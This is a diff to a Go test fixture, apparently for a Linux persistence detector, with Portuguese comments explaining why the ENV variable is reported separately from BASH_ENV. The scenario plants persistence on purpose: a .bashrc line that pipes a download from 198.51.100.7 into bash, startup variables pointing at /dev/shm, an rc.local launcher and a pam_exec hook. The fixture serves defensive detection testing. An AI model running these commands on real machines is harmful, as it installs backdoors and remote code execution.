@@ -691,6 +691,12 @@ func init() {
 			printf '\n\n' >> /root/.bashrc
 			printf 'curl -s http://198.51.100.7/a | bash\n' >> /root/.bashrc
 			printf 'export BASH_ENV=/tmp/.x\n' >> /root/.profile
+			# ENV ao lado do BASH_ENV, de propósito: as duas já foram tratadas
+			# como a mesma variável, e o achado de ENV saía com o título e a
+			# severidade de BASH_ENV. São eventos OPOSTOS — BASH_ENV roda em
+			# shell NÃO interativo, ENV em shell POSIX INTERATIVO —, e este
+			# cenário existe para elas não colapsarem de novo.
+			printf 'export ENV=/dev/shm/.shrc\n' >> /root/.profile
 			printf '#!/bin/sh\n/dev/shm/agent &\nexit 0\n' > /etc/rc.local
 			chmod +x /etc/rc.local
 			printf 'auth optional pam_exec.so /tmp/.notify\n' >> /etc/pam.d/sshd
@@ -700,6 +706,11 @@ func init() {
 			{ID: "persist.shell_startup", Sev: "CRITICAL", Evidence: "FIM do arquivo"},
 			// o caminho que quase ninguém confere: roda em script, cron e scp
 			{ID: "persist.bash_env", Sev: "CRITICAL", Evidence: "NÃO interativo"},
+			// ENV é o outro evento, e sai como achado PRÓPRIO. Crítico aqui
+			// porque o ALVO está em tmpfs — para um caminho comum ele é aviso,
+			// já que `ENV=$HOME/.shrc` é configuração de fábrica em vários
+			// sistemas. É o alvo que decide, não a variável.
+			{ID: "persist.shell_env", Sev: "CRITICAL", Evidence: "/dev/shm/.shrc"},
 			{ID: "persist.trigger_exec", Sev: "CRITICAL", Subject: "/etc/rc.local"},
 			{ID: "persist.pam_exec", Evidence: "a CADA autenticação"},
 			{ID: "persist.udev_run", Evidence: "evento de dispositivo"},
